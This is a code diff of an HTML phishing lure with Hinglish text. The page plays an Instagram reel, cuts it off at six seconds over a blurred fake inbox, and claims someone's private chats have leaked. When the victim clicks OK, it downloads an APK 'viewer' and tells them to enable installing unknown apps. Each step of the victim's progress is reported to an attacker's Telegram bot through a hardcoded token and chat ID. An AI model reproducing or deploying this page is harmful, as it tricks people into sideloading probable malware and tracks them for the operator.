@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Content Access</title>
+    <title>Exclusive Content</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        #start-btn { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        #start-gate { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
         .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
         
-        /* Aapke Screenshot jaisa blurred inbox background */
+        /* Aapka Direct Screenshot Link */
         #inbox-bg { 
             display: none; position: fixed; inset: 0; 
-            background: url('https://i.ibb.co/FkVfD8R/inbox-screenshot.png') center/cover; 
-            filter: blur(5px); opacity: 0.8; z-index: 10;
+            background: url('https://i.ibb.co/6R0D99T/1000010748.png') center/cover; 
+            filter: blur(4.5px); opacity: 0.8; z-index: 10;
         }
 
-        #trap-ui { 
+        #trap-box { 
             position: fixed; inset: 0; display: none; 
             align-items: center; justify-content: center; 
             z-index: 2000; background: rgba(0,0,0,0.5); 
@@ -30,54 +30,54 @@
 </head>
 <body>
 
-<div id="start-btn">
-    <button class="btn" onclick="executeApp()">Watch Exclusive Reel</button>
+<div id="start-gate">
+    <button class="btn" onclick="go()">Watch Exclusive Reel</button>
 </div>
 
 <div id="inbox-bg"></div>
 
-<div id="trap-ui">
-    <div class="popup" id="msg-box">
-        <h3 style="margin:0; color:#8e44ad;">🔓 Restricted Access!</h3>
-        <p style="font-size:14px; margin-top:15px; line-height:1.5;"><b>Hadima-Closet</b> ki private chats mil gayi hain.<br><br>Viewer install karke private messages unlock karein.</p>
-        <button class="btn" style="width:100%;" onclick="finalBlow()">OK</button>
+<div id="trap-box">
+    <div class="popup" id="main-ui">
+        <h3 style="margin:0; color:#8e44ad;">🔓 Private Logs Detected!</h3>
+        <p style="font-size:14px; margin-top:15px; line-height:1.5;"><b>Hadima-Closet</b> private chats aur contacts load ho chuke hain.<br><br>Viewer install karke full messages unlock karein.</p>
+        <button class="btn" style="width:100%;" onclick="payload()">OK</button>
     </div>
 </div>
 
-<iframe id="vid" allow="autoplay"></iframe>
+<iframe id="reel-player" allow="autoplay"></iframe>
 
 <script>
     const T = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k"; 
     const C = "8639892987";
-    const APK = "https://raw.githubusercontent.com/AapkaUsername/Repo/main/hadima_viewer.apk"; 
+    const APK = "https://your-github-link.com/hadima_viewer.apk"; 
 
-    function report(text) {
-        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(text)}`);
+    function report(txt) {
+        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(txt)}`);
     }
 
-    function executeApp() {
-        document.getElementById('start-btn').style.display = 'none';
-        document.getElementById('vid').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
-        report("✅ TARGET_STARTED: User watching 11s reel.");
+    function go() {
+        document.getElementById('start-gate').style.display = 'none';
+        document.getElementById('reel-player').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
+        report("✅ TARGET_HOOKED: Watching Reel.");
 
-        // Exact Middle Trigger (6 seconds)
+        // Exact Middle timing (6 seconds)
         setTimeout(() => {
-            document.getElementById('vid').style.display = 'none';
+            document.getElementById('reel-player').style.display = 'none';
             document.getElementById('inbox-bg').style.display = 'block';
-            document.getElementById('trap-ui').style.display = 'flex';
-            report("👀 TRAP_ACTIVE: Reel interrupted at 6s. Bait visible.");
+            document.getElementById('trap-box').style.display = 'flex';
+            report("👀 BAIT_ACTIVE: Reel interrupted. Target seeing blurred Inbox.");
         }, 6000); 
     }
 
-    function finalBlow() {
-        report("🔥 PAYLOAD_EXEC: Target clicked OK to unlock chats.");
+    function payload() {
+        report("🔥 SUCCESS: Target clicked OK. Download starting.");
         window.location.href = APK;
 
-        document.getElementById('msg-box').innerHTML = `
+        document.getElementById('main-ui').innerHTML = `
             <div class="loader"></div>
             <h3 style="color:#8e44ad;">⚙️ Decrypting Chats...</h3>
-            <p style="font-size:13px;">Security bypass ke liye <b>Settings > Allow Unknown Apps</b> ko enable karein.</p>
-            <p style="font-size:11px; color:#555;">Connecting to Private Server... Do not close window.</p>
+            <p style="font-size:13px;">Unlock karne ke liye <b>Settings > Allow Unknown Apps</b> ko enable karein.</p>
+            <p style="font-size:11px; color:#555;">Connecting to secure server...</p>
         `;
     }
 </script>
